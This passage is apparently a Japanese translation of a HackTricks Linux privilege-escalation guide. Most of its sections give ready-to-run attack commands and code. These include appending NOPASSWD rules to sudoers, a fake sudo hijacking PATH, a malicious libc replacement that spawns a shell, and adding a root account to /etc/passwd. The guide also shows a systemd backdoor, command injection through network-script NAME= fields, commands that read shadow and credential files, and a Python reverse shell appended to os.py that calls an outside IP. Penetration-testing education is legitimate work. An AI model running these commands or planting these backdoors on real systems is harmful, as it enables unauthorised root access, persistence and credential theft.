フォルダ内、またはそのフォルダ内に作成された任意のファイルに**書き込み権限**がある場合、binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使って、**ユーザーと PID の sudo token を作成**できます。\
例えば、_ /var/run/sudo/ts/sampleuser_ を上書きできて、そのユーザーとして PID 1234 の shell を持っている場合、パスワードを知らなくても次のようにして**sudo privileges を取得**できます：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使えるか、そしてどのように使えるかを設定します。これらのファイルは**デフォルトでは user root と group root だけが読み取り可能**です。\
**もし**このファイルを**読める**なら、**興味深い情報を入手できる**可能性があり、**もし**いずれかのファイルに**書き込める**なら、**権限昇格**できます。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みできるなら、この権限を悪用できます
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` binary の代替として、OpenBSD の `doas` などがあります。設定は `/etc/doas.conf` で確認してください
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

もし、**あるユーザーが通常そのマシンに接続し、権限昇格のために `sudo` を使用している**ことが分かっていて、そのユーザーのコンテキストでシェルを取得できたなら、**新しい sudo 実行ファイル**を作成して、root としてあなたのコードを実行したあとにユーザーのコマンドを実行させることができます。次に、ユーザーのコンテキストの **$PATH** を変更し（たとえば `.bash_profile` に新しいパスを追加する）、ユーザーが sudo を実行したときに、あなたの sudo 実行ファイルが実行されるようにします。

ユーザーが別のシェル（bash 以外）を使っている場合は、新しいパスを追加するために別のファイルを変更する必要があります。たとえば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`、`~/.zshrc`、`~/.bash_profile` を変更します。別の例として [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) を見ることができます。

または、次のようなことを実行します:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

ファイル `/etc/ld.so.conf` は、**どこから読み込まれる設定ファイルか** を示します。通常、このファイルには次のパスが含まれています: `include /etc/ld.so.conf.d/*.conf`

これは、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれることを意味します。これらの設定ファイルは、**libraries** が **検索** される別のフォルダを **指しています**。例えば、`/etc/ld.so.conf.d/libc.conf` の内容は `/usr/local/lib` です。**これは、システムが `/usr/local/lib` の中から libraries を探すことを意味します**。

何らかの理由で、ユーザーが示されているパスのいずれかに対して **書き込み権限** を持っている場合: `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の config file に含まれる任意のフォルダ、特権昇格できる可能性があります。\
**この misconfiguration をどう悪用するか** は、次のページを参照してください:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
libを`/var/tmp/flag15/`にコピーすると、`RPATH`変数で指定されているとおり、この場所でプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
その後、`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` を使って `/var/tmp` に evil library を作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities は、利用可能な root privileges の**一部を process に与える**ものです。これにより、root の **privileges がより小さく、個別の単位に分割**されます。各単位は、それぞれ独立して process に付与できます。こうすることで、権限の全体セットが縮小され、exploitation のリスクが低下します。\
以下のページを読んで、**capabilities とそれらの悪用方法についてさらに学んでください**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

directory では、**"execute" の bit** は、影響を受ける user がその folder に "**cd**" できることを意味します。\
**"read"** bit は、user が **files を一覧表示**できることを意味し、**"write"** bit は、user が新しい **files を削除**および**作成**できることを意味します。

## ACLs

Access Control Lists (ACLs) は、従来の ugo/rwx permissions を**上書きできる**、任意権限のセカンダリ層を表します。これらの permissions は、owner でも group の一部でもない特定の user に対して権利を許可または拒否することで、file や directory へのアクセス制御を強化します。このレベルの**粒度**により、より正確な access management が可能になります。詳細は[**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux)を参照してください。

user "kali" に file への read と write permissions を**付与**します:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**特定の ACL を持つ** files をシステムから取得する:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-ins における隠れた ACL バックドア

よくある設定ミスは、`/etc/sudoers.d/` にある root 所有の `440` モードのファイルが、ACL を通じて低権限ユーザーに書き込み権限を与えてしまっているケースです。
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
`user:alice:rw-` のようなものが見える場合、mode bits が厳しく制限されていても、その user は sudo rule を追加できます:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
これは、`ls -l` のみのレビューでは見逃しやすいため、影響の大きい ACL persistence/privesc path です。

## Open shell sessions

**古いバージョン**では、別のユーザー（**root**）の **shell** セッションを **hijack** できる場合があります。\
**最新バージョン**では、**自分のユーザー**の screen セッションにのみ **connect** できます。ただし、セッション内に **interesting information** があるかもしれません。

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは **古い tmux versions** での問題でした。私は、root によって作成された tmux (v2.1) session を、非特権ユーザーとして hijack することができませんでした。

**tmux sessions を一覧表示する**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Debian ベースのシステム (Ubuntu, Kubuntu, など) で 2006年9月から 2008年5月13日までの間に生成されたすべての SSL および SSH keys は、このバグの影響を受ける可能性があります。\
この bug は、これらの OS で新しい ssh key を作成したときに発生します。というのも、**可能な変種は 32,768 通りしかなかった**ためです。つまり、すべての候補を計算でき、**ssh public key があれば対応する private key を探せる**ということです。計算済みの候補はここで確認できます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** password authentication を許可するかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** public key authentication を許可するかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: password authentication が許可されている場合、password が空のアカウントへの login を server が許可するかどうかを指定します。デフォルトは `no` です。

### Login control files

These files influence who can log in and how:

- **`/etc/nologin`**: if present, blocks non-root logins and prints its message.
- **`/etc/securetty`**: restricts where root can log in (TTY allowlist).
- **`/etc/motd`**: post-login banner (can leak environment or maintenance details).

### PermitRootLogin

root が ssh を使って login できるかどうかを指定します。デフォルトは `no` です。可能な値:

- `yes`: root は password と private key で login できる
- `without-password` or `prohibit-password`: root は private key でのみ login できる
- `forced-commands-only`: Root は private key を使い、かつ commands オプションが指定されている場合のみ login できる
- `no` : no

### AuthorizedKeysFile

ユーザー認証に使用できる public keys を含む file を指定します。`%h` のような token を含めることができ、これは home directory に置き換えられます。**絶対パス**(`/` から始まる) または **ユーザーの home からの relative path** を指定できます。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー "**testusername**" の **private** key で login しようとした場合、ssh があなたの key の public key を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding を使うと、**自分のローカル SSH keys を使えて、keys を** サーバー上に放置せずに済みます（passphrases なしで！）。そのため、ssh で **ある host に jump** し、そこから **別の host に jump** するときに、**最初の host** にある **key** を **使用** できます。

この option は `$HOME/.ssh.config` に次のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
`Host` が `*` の場合、ユーザーが別のマシンへ移動するたびに、そのホストがキーへアクセスできるようになります（これはセキュリティ上の問題です）。

ファイル `/etc/ssh_config` はこの **options** を **override** でき、この設定を許可または拒否できます。\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` を使って ssh-agent forwarding を **allow** または **denied** できます（デフォルトは allow です）。

環境内で Forward Agent が設定されていることが分かったら、**権限昇格に悪用できる可能性がある** ため、次のページを読んでください:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

ファイル `/etc/profile` と `/etc/profile.d/` 配下のファイルは、**ユーザーが新しい shell を実行したときに実行される scripts** です。したがって、これらのいずれかに **書き込みまたは変更ができれば、権限昇格できます**。
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **sensitive details**.

### Passwd/Shadow Files

OS によっては、`/etc/passwd` と `/etc/shadow` ファイルが別の名前になっている場合や、バックアップが存在する場合があります。したがって、**それらをすべて見つけ**、**読み取れるか確認**して、ファイル内に **hashes** があるかどうかを確認することが推奨されます:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等の）ファイル内に**password hashes**が見つかることがあります
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のコマンドのいずれかを使ってパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
user `hacker` を追加し、生成されたパスワードを追加します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

`su` コマンドを `hacker:hacker` で使えるようになりました

別の方法として、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
WARNING: マシンの現在のセキュリティを低下させる可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSD プラットフォームでは `/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

**いくつかの機密ファイルに書き込めるか** を確認してください。たとえば、**サービス設定ファイル** に書き込めますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが **tomcat** サーバーを実行していて、**/etc/systemd/ 内の Tomcat サービス設定ファイルを変更できる** 場合、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
バックドアは、tomcat が次に起動されたときに実行されます。

### フォルダを確認する

以下のフォルダには、バックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後のものは読み取れないでしょうが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB files
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のScript/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む可能性のある既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでみると、**パスワードを含んでいる可能性のある複数のファイル** を検索しています。\
これに使える **もう1つの興味深いツール** は [**LaZagne**](https://github.com/AlessandroZ/LaZagne) です。これは、Windows、Linux、Mac のローカルコンピュータに保存された多数のパスワードを取得するためのオープンソースアプリケーションです。

### ログ

ログを読めるなら、その中に **興味深い/機密性の高い情報** が見つかるかもしれません。ログが奇妙であればあるほど、たぶんそれはより興味深いでしょう。\
また、**「悪く」** 設定された（バックドア化された？）**audit logs** により、この投稿で説明されているように、audit logs 内に**パスワードを記録**できる場合があります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**ログを読む**ためには、[**adm**](interesting-groups-linux-pe/index.html#adm-group) グループがとても役立ちます。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

**password** を含むファイルを、**名前**に含む場合でも**内容**に含む場合でもチェックし、さらにログ内の IP やメールアドレス、hashes の regexp もチェックすべきです。\
これらをすべてどうやるかはここでは列挙しませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が行う最後のチェックを確認できます。

## Writable files

### Python library hijacking

どこから **python** スクリプトが実行されるかが分かっていて、そのフォルダ内に**書き込み**できるか、あるいは **python libraries** を変更できるなら、OS library を改変して backdoor 化できます（python スクリプトが実行される場所に書き込めるなら、os.py library をコピー＆ペーストしてください）。

**library** を backdoor 化するには、os.py library の末尾に次の行を追加します（IP と PORT を変更してください）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` の脆弱性により、ログファイルまたはその親ディレクトリに対して **write permissions** を持つユーザーが、権限昇格できる可能性があります。これは、`logrotate` がしばしば **root** で実行され、特に _**/etc/bash_completion.d/**_ のようなディレクトリ内で、任意のファイルを実行するように操作できるためです。_**/var/log**_ だけでなく、log rotation が適用されるすべてのディレクトリの permissions を確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` 以前に影響します

脆弱性のより詳細な情報は、こちらのページで確認できます: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** と非常に似ているため、ログを書き換えられることが分かったら、誰がそれらのログを管理しているかを確認し、symlinks を使ってログを差し替えることで権限昇格できるかを確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由で、ユーザーが _/etc/sysconfig/network-scripts_ に `ifcf-<whatever>` スクリプトを **write** できる、または既存のものを **adjust** できるなら、**system is pwned** です。

ネットワークスクリプト、たとえば _ifcg-eth0_ はネットワーク接続に使われます。見た目は .INI ファイルとまったく同じです。しかし Linux では Network Manager (dispatcher.d) によって \~sourced\~ されます。

私のケースでは、これらのネットワークスクリプト内の `NAME=` 属性が正しく処理されません。名前に **white/blank space** があると、システムは空白の後ろの部分を実行しようとします。つまり、**最初の空白以降のすべてが root として実行されます**。

例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Note the blank space between Network and /bin/id_)

### **init, init.d, systemd, and rc.d**

ディレクトリ `/etc/init.d` は、**scripts** for System V init (SysVinit)、つまり **classic Linux service management system** の置き場です。ここにはサービスを `start`、`stop`、`restart`、場合によっては `reload` するためのスクリプトが含まれます。これらは直接実行することも、`/etc/rc?.d/` にある symbolic links 経由で実行することもできます。Redhat 系のシステムでは代替パスとして `/etc/rc.d/init.d` があります。

一方、`/etc/init` は **Upstart** に関連しており、Ubuntu によって導入されたより新しい **service management** で、service management tasks 用の configuration files を使います。Upstart への移行後も、Upstart の compatibility layer により、SysVinit scripts は Upstart configurations と並行して今でも利用されています。

**systemd** は modern initialization and service manager として登場し、on-demand daemon starting、automount management、system state snapshots などの advanced features を提供します。`/usr/lib/systemd/` には distribution packages 用のファイル、`/etc/systemd/system/` には administrator modifications 用のファイルを配置し、system administration process を効率化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は一般的に syscall を hook して、特権的な kernel functionality を userspace manager に公開します。弱い manager authentication（例: FD-order に基づく signature checks や不十分な password schemes）は、local app が manager を impersonate して、すでに rooted な devices で root へ privilege escalation することを可能にします。詳細と exploitation はこちら:

{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations における regex-driven service discovery は、process command lines から binary path を抽出し、privileged context で `-v` を付けて実行できます。許容的な patterns（例: `\S` を使うもの）は、attacker-staged listeners を writable locations（例: `/tmp/httpd`）からマッチさせてしまい、root としての execution（CWE-426 Untrusted Search Path）につながる可能性があります。

詳細と、他の discovery/monitoring stacks にも適用できる一般化された pattern はこちら:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors を探す最良の tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と MAC の kernel vulns を列挙 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
